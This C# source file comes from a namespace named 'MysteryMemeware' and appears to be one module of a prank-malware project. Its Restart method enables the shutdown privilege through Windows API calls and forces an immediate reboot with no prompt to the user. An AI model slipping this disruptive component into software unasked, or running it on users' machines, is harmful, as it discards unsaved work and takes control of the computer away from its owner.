namespace MysteryMemeware
{
    public static class WinLogOffModule
    {
        private struct LUID
        {
            public int LowPart;
            public int HighPart;
        }
        private struct LUID_AND_ATTRIBUTES
        {
            public LUID pLuid;
            public int Attributes;
        }
        private struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }
        [System.Runtime.InteropServices.DllImport("advapi32.dll")]
        private static extern int OpenProcessToken(System.IntPtr ProcessHandle, int DesiredAccess, out System.IntPtr TokenHandle);
        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        private static extern bool AdjustTokenPrivileges(System.IntPtr TokenHandle, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, System.IntPtr PreviousState, System.IntPtr ReturnLength);
        [System.Runtime.InteropServices.DllImport("advapi32.dll")]
        private static extern int LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        private static extern int ExitWindowsEx(uint uFlags, uint dwReason);
        public static void Restart()
        {
            System.IntPtr hToken;
            OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 40, out hToken);
            TOKEN_PRIVILEGES tkp;
            tkp.PrivilegeCount = 1;
            tkp.Privileges.Attributes = 2;
            LookupPrivilegeValue("", "SeShutdownPrivilege", out tkp.Privileges.pLuid);
            AdjustTokenPrivileges(hToken, false, ref tkp, 0, System.IntPtr.Zero, System.IntPtr.Zero);
            ExitWindowsEx(6, 0);
        }
    }
}